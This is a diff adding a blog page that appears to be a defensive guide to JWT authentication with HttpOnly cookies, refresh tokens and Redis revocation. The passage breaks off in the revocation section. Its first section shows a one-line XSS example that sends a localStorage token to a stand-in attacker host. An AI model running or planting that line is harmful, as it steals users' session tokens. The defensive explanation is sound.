@@ -1,0 +1,1887 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting — zebMalik.tech Blog</title>
+<meta name="description" content="Stop storing tokens in localStorage. The definitive security guide to HttpOnly cookies, rotating refresh tokens, and Redis revocation.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Instrument+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/styles.css?v=6">
+<script src="/theme.js"></script>
+<style>
+  /* ============================================================
+     Widescreen Reader Layout with Small Edge Margins (Wikipedia Style)
+     ============================================================ */
+
+  /* Header and Footer Widescreen Alignment (Small edge gaps) */
+  .site-header .hdr {
+    max-width: 1840px;
+    width: calc(100% - 48px);
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  .site-footer .wrap {
+    max-width: 1840px;
+    width: calc(100% - 48px);
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  /* Main Reader Container */
+  .reader-container {
+    max-width: 1840px;
+    width: calc(100% - 48px);
+    margin: 0 auto;
+    padding: 0;
+  }
+
+  @media (max-width: 768px) {
+    .site-header .hdr,
+    .site-footer .wrap,
+    .reader-container {
+      width: 100%;
+      padding: 0 16px;
+    }
+  }
+
+  @media (max-width: 400px) {
+    .site-header .hdr,
+    .site-footer .wrap,
+    .reader-container {
+      padding: 0 12px;
+    }
+  }
+
+  /* Pagehead Title & Byline (Occupying full available space) */
+  .pagehead-reader {
+    padding: 2.25rem 0 1.25rem 0;
+    border-bottom: 1px solid var(--line);
+  }
+  .pagehead-reader h1,
+  .reader-title {
+    margin-top: 0.75rem;
+    font-size: clamp(26px, 4.2vw, 48px);
+    line-height: 1.2;
+    letter-spacing: -0.025em;
+    font-weight: 600;
+    color: var(--ink);
+    max-width: 100% !important;
+    width: 100%;
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+  .reader-byline {
+    display: flex;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0.6rem 1.15rem;
+    margin-top: 1.15rem;
+    color: var(--ink-2);
+    font-size: 0.95rem;
+  }
+
+  @media (max-width: 640px) {
+    .pagehead-reader {
+      padding: 1.35rem 0 0.85rem 0;
+    }
+    .pagehead-reader h1,
+    .reader-title {
+      font-size: clamp(22px, 6.2vw, 32px);
+      line-height: 1.25;
+      margin-top: 0.5rem;
+    }
+    .reader-byline {
+      font-size: 0.84rem;
+      gap: 4px 10px;
+      margin-top: 0.75rem;
+    }
+  }
+
+  /* 3-Column Responsive Grid */
+  .reader-grid {
+    display: grid;
+    grid-template-columns: 240px minmax(0, 1fr) 290px;
+    grid-template-areas: "toc main info";
+    gap: 36px;
+    align-items: start;
+    margin-top: 2rem;
+    margin-bottom: 4rem;
+  }
+
+  .reader-grid.no-toc {
+    grid-template-columns: minmax(0, 1fr) 290px;
+    grid-template-areas: "main info";
+  }
+
+  .reader-left-col {
+    grid-area: toc;
+    position: sticky;
+    top: 92px;
+  }
+
+  .reader-center-col {
+    grid-area: main;
+    min-width: 0;
+  }
+
+  .reader-right-col {
+    grid-area: info;
+    position: sticky;
+    top: 92px;
+    width: 100%;
+    max-width: 290px;
+  }
+
+  @media (max-width: 1280px) and (min-width: 1025px) {
+    .reader-grid {
+      grid-template-columns: 210px minmax(0, 1fr) 260px;
+      gap: 20px;
+    }
+    .reader-grid.no-toc {
+      grid-template-columns: minmax(0, 1fr) 260px;
+      gap: 20px;
+    }
+    .reader-right-col {
+      max-width: 260px;
+    }
+  }
+
+  @media (max-width: 1024px) {
+    .reader-grid {
+      grid-template-columns: 220px minmax(0, 1fr);
+      grid-template-areas: "toc main";
+      gap: 24px;
+    }
+    .reader-grid.no-toc {
+      grid-template-columns: 1fr;
+      grid-template-areas: "main";
+    }
+    .reader-right-col {
+      display: none;
+    }
+  }
+
+  @media (max-width: 980px) {
+    .reader-grid,
+    .reader-grid.no-toc {
+      grid-template-columns: 1fr;
+      grid-template-areas: "main";
+      gap: 18px;
+      margin-top: 1.25rem;
+      margin-bottom: 2.5rem;
+    }
+    .reader-left-col {
+      position: static;
+      grid-area: auto;
+      width: 100%;
+    }
+    .toc-card {
+      position: static;
+      max-height: none;
+      padding: 0.85rem 1rem;
+      background: var(--paper-2);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+    }
+    .toc-header {
+      margin-bottom: 0;
+      padding-bottom: 0;
+      border-bottom: none;
+      cursor: pointer;
+    }
+    .toc-header.open {
+      margin-bottom: 0.75rem;
+      padding-bottom: 0.5rem;
+      border-bottom: 1px solid var(--line);
+    }
+    .toc-toggle {
+      font-size: 13px;
+      font-weight: 600;
+      padding: 3px 8px;
+      background: var(--paper);
+      border: 1px solid var(--line);
+      border-radius: 4px;
+    }
+    .toc-links {
+      display: none;
+      max-height: 50vh;
+      overflow-y: auto;
+      -webkit-overflow-scrolling: touch;
+    }
+    .toc-footer {
+      display: none;
+    }
+  }
+
+  /* Left Column: Wikipedia-style Table of Contents */
+  .toc-card {
+    background: var(--paper-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 1.25rem;
+    max-height: calc(100vh - 110px);
+    overflow-y: auto;
+  }
+  .toc-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 0.75rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px solid var(--line);
+  }
+  .toc-title {
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 600;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--ink);
+  }
+  .toc-toggle {
+    font-size: 12px;
+    color: var(--accent);
+    cursor: pointer;
+    user-select: none;
+  }
+  .toc-links {
+    display: flex;
+    flex-direction: column;
+    gap: 4px;
+    margin-bottom: 1.25rem;
+  }
+  .toc-item {
+    color: var(--ink-2);
+    font-size: 0.88rem;
+    line-height: 1.4;
+    padding: 5px 8px;
+    border-radius: 4px;
+    text-decoration: none;
+    transition: all 0.15s ease;
+    border-left: 2px solid transparent;
+    display: block;
+    word-break: break-word;
+  }
+  .toc-item:hover {
+    color: var(--accent);
+    background: var(--paper);
+  }
+  .toc-item.active {
+    color: var(--accent);
+    background: var(--paper);
+    border-left-color: var(--accent);
+    font-weight: 600;
+  }
+  .toc-item.toc-h3 {
+    padding-left: 18px;
+    font-size: 0.82rem;
+    color: var(--ink-3);
+  }
+  .toc-footer {
+    padding-top: 1rem;
+    border-top: 1px solid var(--line);
+  }
+  .reading-progress-wrap {
+    margin-bottom: 0.75rem;
+  }
+  .reading-progress-label {
+    font-size: 11px;
+    font-family: var(--mono);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--ink-3);
+    margin-bottom: 4px;
+  }
+  .reading-progress-bar {
+    width: 100%;
+    height: 4px;
+    background: var(--line);
+    border-radius: 2px;
+    overflow: hidden;
+  }
+  #read-progress-fill {
+    height: 100%;
+    background: var(--accent);
+    transition: width 0.1s ease;
+  }
+  .toc-share {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 12px;
+    color: var(--ink-2);
+  }
+  .share-btn {
+    background: var(--paper);
+    border: 1px solid var(--line);
+    border-radius: 4px;
+    padding: 4px 8px;
+    cursor: pointer;
+    font-size: 12px;
+    color: var(--ink);
+    transition: all 0.15s ease;
+  }
+  .share-btn:hover {
+    background: var(--accent);
+    color: #fff;
+    border-color: var(--accent);
+  }
+
+  /* Center Column: Cover Image & Article Body */
+  .reader-center-col {
+    min-width: 0;
+  }
+  .post-cover-wrapper {
+    width: 100%;
+    margin-bottom: 2rem;
+  }
+  .post-cover-img {
+    width: 100%;
+    max-height: 520px;
+    object-fit: cover;
+    border-radius: 8px;
+    border: 1px solid var(--line);
+    box-shadow: 0 8px 30px rgba(18, 19, 22, 0.06);
+    display: block;
+  }
+
+  .article-body {
+    font-size: 1.18rem;
+    line-height: 1.85;
+    color: var(--ink);
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+  .article-body h1, .article-body h2, .article-body h3, .article-body h4 {
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+
+  .article-body h1 {
+    font-size: clamp(28px, 4vw, 40px);
+    margin-top: 3.5rem;
+    margin-bottom: 1.25rem;
+  }
+  .article-body h2 {
+    margin-top: 3.5rem;
+    margin-bottom: 1.25rem;
+    font-size: clamp(24px, 3.2vw, 34px);
+    border-bottom: 1px solid var(--line);
+    padding-bottom: 0.5rem;
+    letter-spacing: -0.02em;
+    scroll-margin-top: 90px;
+  }
+  .article-body h3 {
+    margin-top: 2.25rem;
+    margin-bottom: 0.85rem;
+    font-size: clamp(19px, 2.4vw, 24px);
+    letter-spacing: -0.01em;
+    scroll-margin-top: 90px;
+  }
+  .article-body p {
+    margin-bottom: 1.65rem;
+  }
+  .article-body ul, .article-body ol {
+    margin-bottom: 1.75rem;
+    padding-left: 1.75rem;
+  }
+  .article-body li {
+    margin-bottom: 0.65rem;
+    line-height: 1.75;
+  }
+  .article-body pre {
+    background: var(--paper-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 1.25rem 1.5rem;
+    overflow-x: auto;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.95rem;
+    margin: 2rem 0;
+    max-width: 100%;
+    -webkit-overflow-scrolling: touch;
+  }
+  .article-body code {
+    font-family: 'JetBrains Mono', monospace;
+    background: var(--paper-2);
+    padding: 0.2rem 0.45rem;
+    border-radius: 4px;
+    font-size: 0.9em;
+    border: 1px solid var(--line);
+    overflow-wrap: break-word;
+    word-break: break-word;
+  }
+  .article-body pre code {
+    background: none;
+    padding: 0;
+    border: none;
+    word-break: normal;
+    white-space: pre;
+    font-size: 1em;
+  }
+  .article-body img {
+    max-width: 100%;
+    height: auto;
+    border-radius: 8px;
+    border: 1px solid var(--line);
+    margin: 2rem 0;
+    box-shadow: 0 6px 24px rgba(18, 19, 22, 0.05);
+    display: block;
+  }
+  .article-body blockquote {
+    border-left: 4px solid var(--accent);
+    margin: 2rem 0;
+    padding: 1.1rem 1.5rem;
+    background: var(--paper-2);
+    border-radius: 0 8px 8px 0;
+    color: var(--ink-2);
+    font-style: italic;
+  }
+  .article-body table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 2rem 0;
+    font-size: 1rem;
+    display: block;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+  .article-body th, .article-body td {
+    padding: 10px 14px;
+    border: 1px solid var(--line);
+    text-align: left;
+  }
+  .article-body th {
+    background: var(--paper-2);
+    font-weight: 600;
+  }
+
+  @media (max-width: 640px) {
+    .article-body {
+      font-size: 1.04rem;
+      line-height: 1.72;
+    }
+    .article-body h1 {
+      font-size: clamp(23px, 5.5vw, 30px);
+      margin-top: 2.25rem;
+      margin-bottom: 0.75rem;
+    }
+    .article-body h2 {
+      font-size: clamp(20px, 4.8vw, 25px);
+      margin-top: 2.25rem;
+      margin-bottom: 0.75rem;
+      padding-bottom: 0.4rem;
+      scroll-margin-top: 75px;
+    }
+    .article-body h3 {
+      font-size: clamp(17px, 4vw, 20px);
+      margin-top: 1.6rem;
+      margin-bottom: 0.5rem;
+      scroll-margin-top: 75px;
+    }
+    .article-body p {
+      margin-bottom: 1.35rem;
+    }
+    .article-body ul, .article-body ol {
+      margin-bottom: 1.35rem;
+      padding-left: 1.25rem;
+    }
+    .article-body li {
+      margin-bottom: 0.45rem;
+      line-height: 1.65;
+    }
+    .article-body pre {
+      padding: 0.85rem 1rem;
+      font-size: 0.82rem;
+      margin: 1.25rem 0;
+      border-radius: 6px;
+    }
+    .article-body code {
+      font-size: 0.85em;
+    }
+    .article-body table {
+      font-size: 0.85rem;
+      margin: 1.25rem 0;
+    }
+    .article-body th, .article-body td {
+      padding: 8px 10px;
+    }
+    .article-body blockquote {
+      margin: 1.35rem 0;
+      padding: 0.85rem 1rem;
+      font-size: 0.98rem;
+    }
+    .article-body img {
+      margin: 1.25rem 0;
+      border-radius: 6px;
+    }
+    .post-cover-wrapper {
+      margin-bottom: 1.25rem;
+    }
+    .post-cover-img {
+      max-height: 240px;
+      border-radius: 6px;
+    }
+    .ad-slot {
+      min-height: 60px;
+      font-size: 9px;
+      margin: 1.25rem 0 !important;
+    }
+  }
+
+  /* Author Card & Mobile Explore Tools Card */
+  .article-author-card {
+    margin-top: 4rem;
+    padding: 2rem;
+    background: var(--paper-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+  }
+  .author-card-inner {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 1.5rem;
+    flex-wrap: wrap;
+  }
+  .author-card-bio-group {
+    display: flex;
+    align-items: center;
+    gap: 1.25rem;
+  }
+  .author-avatar-box {
+    width: 64px;
+    height: 64px;
+    border-radius: 50%;
+    background: var(--paper-3);
+    border: 1px solid var(--line);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 600;
+    font-size: 1.4rem;
+    color: var(--ink-2);
+    overflow: hidden;
+    flex-shrink: 0;
+  }
+  .mobile-tools-card {
+    display: none;
+    margin-top: 2rem;
+    padding: 1.25rem;
+    background: var(--paper-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+  }
+  @media (max-width: 1024px) {
+    .mobile-tools-card {
+      display: block;
+    }
+  }
+  @media (max-width: 640px) {
+    .article-author-card {
+      margin-top: 2.5rem;
+      padding: 1.25rem 1rem;
+    }
+    .author-card-inner {
+      gap: 1rem;
+    }
+    .author-card-bio-group {
+      gap: 0.85rem;
+    }
+    .author-avatar-box {
+      width: 48px;
+      height: 48px;
+      font-size: 1.15rem;
+    }
+    #author-name {
+      font-size: 1.15rem !important;
+    }
+    #author-bio {
+      font-size: 0.88rem !important;
+    }
+  }
+
+  /* Article Hyperlinks (Blue with small link icon like Wikipedia/Google) */
+  .article-body a {
+    color: #1a73e8;
+    text-decoration: underline;
+    text-decoration-color: rgba(26, 115, 232, 0.4);
+    text-underline-offset: 3px;
+    font-weight: 500;
+    transition: color 0.15s ease, text-decoration-color 0.15s ease;
+  }
+  .article-body a:hover {
+    color: #1557b0;
+    text-decoration-color: #1557b0;
+  }
+  .article-body a::after {
+    content: "";
+    display: inline-block;
+    width: 11px;
+    height: 11px;
+    margin-left: 4px;
+    margin-right: 2px;
+    vertical-align: 0.5px;
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231a73e8' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'%3E%3C/path%3E%3Cpolyline points='15 3 21 3 21 9'%3E%3C/polyline%3E%3Cline x1='10' y1='14' x2='21' y2='3'%3E%3C/line%3E%3C/svg%3E");
+    background-size: contain;
+    background-repeat: no-repeat;
+    opacity: 0.85;
+    transition: transform 0.15s ease, opacity 0.15s ease;
+  }
+  .article-body a:hover::after {
+    opacity: 1;
+    transform: translate(1px, -1px);
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231557b0' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'%3E%3C/path%3E%3Cpolyline points='15 3 21 3 21 9'%3E%3C/polyline%3E%3Cline x1='10' y1='14' x2='21' y2='3'%3E%3C/line%3E%3C/svg%3E");
+  }
+  /* Exclude buttons, internal anchors, and images from link icons */
+  .article-body a.btn,
+  .article-body a.no-icon,
+  .article-body a:has(img),
+  .article-body a[href^="#"] {
+    display: inline;
+  }
+  .article-body a.btn::after,
+  .article-body a.no-icon::after,
+  .article-body a:has(img)::after,
+  .article-body a[href^="#"]::after {
+    display: none !important;
+  }
+
+  [data-theme="dark"] .article-body a {
+    color: #58a6ff;
+    text-decoration-color: rgba(88, 166, 255, 0.4);
+  }
+  [data-theme="dark"] .article-body a:hover {
+    color: #79c0ff;
+    text-decoration-color: #79c0ff;
+  }
+  [data-theme="dark"] .article-body a::after {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2358a6ff' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'%3E%3C/path%3E%3Cpolyline points='15 3 21 3 21 9'%3E%3C/polyline%3E%3Cline x1='10' y1='14' x2='21' y2='3'%3E%3C/line%3E%3C/svg%3E");
+  }
+  [data-theme="dark"] .article-body a:hover::after {
+    background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2379c0ff' stroke-width='2.2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6'%3E%3C/path%3E%3Cpolyline points='15 3 21 3 21 9'%3E%3C/polyline%3E%3Cline x1='10' y1='14' x2='21' y2='3'%3E%3C/line%3E%3C/svg%3E");
+  }
+
+  /* Right Column: Wikipedia-style Infobox & Sidebar */
+  .reader-right-col {
+    position: sticky;
+    top: 92px;
+  }
+  .infobox-card {
+    background: var(--paper-2);
+    border: 1px solid var(--line);
+    border-radius: 8px;
+    padding: 1.25rem;
+    font-size: 0.92rem;
+  }
+  .infobox-header {
+    margin-bottom: 0.85rem;
+    padding-bottom: 0.65rem;
+    border-bottom: 1px solid var(--line);
+  }
+  .infobox-badge {
+    font-family: var(--mono);
+    font-size: 11px;
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    color: var(--accent);
+    font-weight: 600;
+    display: block;
+    margin-bottom: 4px;
+  }
+  .infobox-header h4 {
+    font-size: 1.15rem;
+    font-weight: 600;
+    color: var(--ink);
+  }
+  .infobox-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 0.88rem;
+    display: table;
+  }
+  .infobox-table th, .infobox-table td {
+    padding: 8px 4px;
+    border-bottom: 1px solid var(--line);
+    vertical-align: top;
+  }
+  .infobox-table th {
+    text-align: left;
+    color: var(--ink-2);
+    font-weight: 500;
+    width: 42%;
+  }
+  .infobox-table td {
+    text-align: right;
+    color: var(--ink);
+    font-weight: 500;
+  }
+  .infobox-links a {
+    display: block;
+    padding: 6px 0;
+    color: var(--ink-2);
+    font-size: 0.9rem;
+    border-bottom: 1px dashed var(--line);
+    transition: color 0.15s ease;
+  }
+  .infobox-links a:hover {
+    color: var(--accent);
+  }
+</style>
+<!-- SEO-META -->
+<link rel="canonical" href="https://zebmalik.tech/posts/modern-jwt-authentication-architecture/">
+
+<script>
+  (function() {
+    var params = new URLSearchParams(window.location.search);
+    var slug = params.get('slug');
+    if (slug) {
+      var canonicalUrl = 'https://zebmalik.tech/post?slug=' + encodeURIComponent(slug);
+      var link = document.getElementById('canonical-meta');
+      if (link) link.href = canonicalUrl;
+    }
+  })();
+</script>
+<meta name="robots" content="index, follow, max-image-preview:large">
+<meta name="author" content="zebMalik.tech">
+<meta name="theme-color" content="#121316">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="zebMalik.tech">
+<meta property="og:title" content="Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting">
+<meta property="og:description" content="Stop storing tokens in localStorage. The definitive security guide to HttpOnly cookies, rotating refresh tokens, and Redis revocation.">
+<meta property="og:image" content="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80">
+<meta property="og:image:alt" content="zebMalik.tech">
+<meta property="og:locale" content="en_US">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting">
+<meta name="twitter:description" content="Stop storing tokens in localStorage. The definitive security guide to HttpOnly cookies, rotating refresh tokens, and Redis revocation.">
+<meta name="twitter:image" content="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80">
+<meta name="google-adsense-account" content="ca-pub-9522829065676411">
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9522829065676411" crossorigin="anonymous"></script>
+<script type="application/ld+json" id="post-jsonld">{"@context":"https://schema.org","@type":"BlogPosting","headline":"Modern JWT Authentication Architecture: Access, Refresh Tokens & Blacklisting","description":"Stop storing tokens in localStorage. The definitive security guide to HttpOnly cookies, rotating refresh tokens, and Redis revocation.","image":"https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=1200&q=80","url":"https://zebmalik.tech/posts/modern-jwt-authentication-architecture/","datePublished":"2026-09-19T16:43:23.79741+00:00","dateModified":"2026-09-19T16:43:23.79741+00:00","author":{"@type":"Person","name":"Muhammad Shahzeb Malik"},"publisher":{"@type":"Organization","name":"zebMalik.tech","url":"https://zebmalik.tech","logo":{"@type":"ImageObject","url":"https://zebmalik.tech/android-chrome-512x512.png"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://zebmalik.tech/posts/modern-jwt-authentication-architecture/"}}</script>
+<!-- /SEO-META -->
+  <script>window.__POST_DATA__ = {"id":"c094b919-da7c-4582-be43-5c4a61c177f5","slug":"modern-jwt-authentication-architecture","title":"Modern JWT Authentication Architecture: Access, Refresh Tokens & Blacklisting"};</script>
+</head>
+<body data-prerendered="true">
+<div id="reading-progress-bar"></div>
+<header class="site-header">
+  <div class="wrap hdr">
+    <a class="brand" href="/">zebMalik<em>.tech</em></a>
+    <button class="menu-btn" aria-label="Menu" onclick="document.querySelector('.mainnav').classList.toggle('open')"><span></span><span></span><span></span></button>
+    <nav class="mainnav">
+      <a href="/services">Services</a>
+      <a href="/tools">Tools</a>
+      <a href="/blog">Blog</a>
+      <a href="/work">Work</a>
+      <a href="/pricing">Pricing</a>
+      <a href="/about">About</a>
+      <a href="/contact">Contact</a>
+      <a href="/free-sample" class="navcta">Free sample</a>
+    </nav>
+    <div class="hdr-actions">
+      <button class="cmd-trigger-btn" type="button" aria-label="Open command palette" title="Search articles, tools, and actions (Ctrl+K)">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+        <span class="cmd-trigger-kbd">⌘K</span>
+      </button>
+      <button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle color theme" title="Toggle dark/light mode">
+        <svg class="theme-icon-moon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+        <svg class="theme-icon-sun" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+      </button>
+      <a href="/free-sample" class="btn">Get a free sample</a>
+    </div>
+  </div>
+</header>
+
+<div class="pagehead pagehead-reader">
+  <div class="reader-container">
+    <div style="margin-bottom:1rem">
+      <a href="/blog" class="arrow-link">&larr; All Articles</a>
+    </div>
+    <span id="post-meta" class="label">🌐 Data Engineering &amp; Pipelines &bull; Sep 19, 2026 &bull; 2 min read &bull; 195 verified reads</span>
+    <h1 id="post-title" class="reader-title">Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting</h1>
+    <div id="post-byline" class="reader-byline">
+    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
+      <span>By <strong>Muhammad Shahzeb Malik</strong></span>
+      <span>&bull;</span>
+      <span>Sep 19, 2026</span>
+      <button type="button" id="post-byline-bm" class="btn-bookmark" data-slug="modern-jwt-authentication-architecture" title="Save article for later" aria-label="Bookmark article">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg>
+        <span class="bm-text">Save</span>
+      </button>
+    </div>
+    <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin-top:6px"><span class="chip chip-static">#security</span> <span class="chip chip-static">#auth</span> <span class="chip chip-static">#jwt</span> <span class="chip chip-static">#webdev</span></div></div>
+  </div>
+</div>
+
+<div class="reader-container">
+  <div class="reader-grid">
+    <!-- Left Column: Wikipedia-style Sticky Table of Contents -->
+    <aside id="toc-container" class="reader-left-col">
+      <div class="toc-card">
+        <div class="toc-header" onclick="toggleToc(document.querySelector('.toc-toggle'))">
+          <span class="toc-title">Contents</span>
+          <span class="toc-toggle" onclick="event.stopPropagation();toggleToc(this)">[hide]</span>
+        </div>
+        <nav id="toc-list" class="toc-links">
+<a href="#post-title" class="toc-item toc-top active">(Top)</a>
+          <a href="#sec-0-1-why-localstorage-is-fundamentally-insecure-for-auth" class="toc-item toc-h2">1. Why localStorage is Fundamentally Insecure for Auth</a>
+          <a href="#sec-1-the-fix-httponly-secure-samesite-strict-cookies" class="toc-item toc-h3">The Fix: HttpOnly , Secure , SameSite=Strict Cookies</a>
+          <a href="#sec-2-2-the-dual-token-strategy-access-vs-refresh" class="toc-item toc-h2">2. The Dual-Token Strategy: Access vs. Refresh</a>
+          <a href="#sec-3-3-instant-logout-amp-revocation-with-redis" class="toc-item toc-h2">3. Instant Logout &amp;amp; Revocation with Redis</a>
+          <a href="#sec-4-summary-checklist" class="toc-item toc-h2">Summary Checklist</a>
+        </nav>
+        <div class="toc-footer">
+          <div class="reading-progress-wrap">
+            <div class="reading-progress-label">Reading progress</div>
+            <div class="reading-progress-bar"><div id="read-progress-fill" style="width:0%"></div></div>
+          </div>
+          <div class="toc-share">
+            <span>Share:</span>
+            <button onclick="shareArticle('twitter')" class="share-btn" title="Share on X">𝕏</button>
+            <button onclick="shareArticle('linkedin')" class="share-btn" title="Share on LinkedIn">in</button>
+            <button onclick="shareArticle('copy')" class="share-btn" title="Copy link">🔗</button>
+          </div>
+        </div>
+      </div>
+    </aside>
+
+    <!-- Center Column: Hero Graphic, Article Content & Author Card -->
+    <main class="reader-center-col">
+      <div id="post-cover-wrapper" class="post-cover-wrapper"><img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&amp;fit=crop&amp;w=1200&amp;q=80" alt="Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting" style="width:100%;max-height:480px;object-fit:cover;border-radius:8px;border:1px solid var(--line);margin-bottom:2rem"></div>
+
+      <div class="ad-slot" aria-label="Advertisement" style="margin-bottom:2rem"><span>Advertisement</span></div>
+
+      <article id="post-content" class="article-body">
+<h1>Modern JWT Authentication Architecture: Access, Refresh Tokens &amp; Blacklisting</h1>
+<p>JSON Web Tokens (JWTs) remain one of the most widely implemented authentication formats on the web. Unfortunately, tutorials that demonstrate storing JWTs in browser <code>localStorage</code> expose millions of users to catastrophic Cross-Site Scripting (XSS) token theft.</p>
+<p>In this guide, we outline a zero-trust, enterprise JWT architecture using <strong>HttpOnly cookies</strong>, <strong>rotating refresh tokens</strong>, and <strong>Redis revocation blacklists</strong>.</p>
+<hr>
+<h2 id="sec-0-1-why-localstorage-is-fundamentally-insecure-for-auth">1. Why <code>localStorage</code> is Fundamentally Insecure for Auth</h2>
+<p>Any third-party script on your page (such as an analytics tag, ads script, or compromised npm dependency) has unrestricted read access to <code>localStorage</code>:</p>
+<pre><code class="language-javascript">// A single XSS flaw allows any attacker to steal credentials:
+fetch(&#39;https://malicious-c2.com/steal?token=&#39; + localStorage.getItem(&#39;token&#39;));
+</code></pre>
+<h3 id="sec-1-the-fix-httponly-secure-samesite-strict-cookies">The Fix: <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Strict</code> Cookies</h3>
+<p>When tokens are stored in <code>HttpOnly</code> cookies, JavaScript cannot access or read them under any circumstances. The browser automatically attaches the cookie to outbound HTTP requests:</p>
+<pre><code class="language-http">Set-Cookie: access_token=eyJhbGci...; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=900
+</code></pre>
+<hr>
+<h2 id="sec-2-2-the-dual-token-strategy-access-vs-refresh">2. The Dual-Token Strategy: Access vs. Refresh</h2>
+<ul>
+<li><strong>Access Token</strong>: Short lifespan (<strong>15 minutes</strong>). Carries user identity and permissions. Validated statelessly by microservices.</li>
+<li><strong>Refresh Token</strong>: Long lifespan (<strong>7 to 30 days</strong>). Stored hashed in the database. Used strictly to mint fresh access tokens.</li>
+</ul>
+<hr>
+<h2 id="sec-3-3-instant-logout-amp-revocation-with-redis">3. Instant Logout &amp; Revocation with Redis</h2>
+<p>Because JWTs are cryptographically stateless, an issued access token remains technically valid until its expiration timestamp. </p>
+<p>To support immediate revocation (e.g., when a user clicks &quot;Log out of all devices&quot; or changes their password), store token <code>jti</code> (JWT ID) identifiers in a fast Redis cache with a Time-To-Live (TTL) matching the token expiration:</p>
